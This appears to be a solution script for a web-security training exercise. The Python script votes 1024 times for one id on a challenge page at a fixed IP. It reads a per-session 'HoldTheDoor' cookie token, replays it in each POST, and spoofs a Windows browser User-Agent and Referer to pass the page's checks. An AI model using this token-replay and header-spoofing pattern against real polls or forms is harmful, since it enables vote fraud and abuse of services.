#!/usr/bin/python3
""" Write a script or a program that votes 1024 times for your id here: http://158.69.76.135/level2.php """
""" We only take votes from Windows users. """
import requests

url = "http://158.69.76.135/level2.php"
headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; rv:68.0) Gecko/20100101 Firefox/68.0', 'Referer': 'http://158.69.76.135/level2.php'}

with requests.session() as client:
    for i in range(1024):
        key = client.get(url)
        key_dic = key.cookies.get_dict()
        cookies = key.cookies['HoldTheDoor']
        data_post = {"id": 1992, "holdthedoor": "Submit", "key": key_dic['HoldTheDoor']}
        client.post(url, data=data_post, cookies={'HoldTheDoor': cookies}, headers=headers)
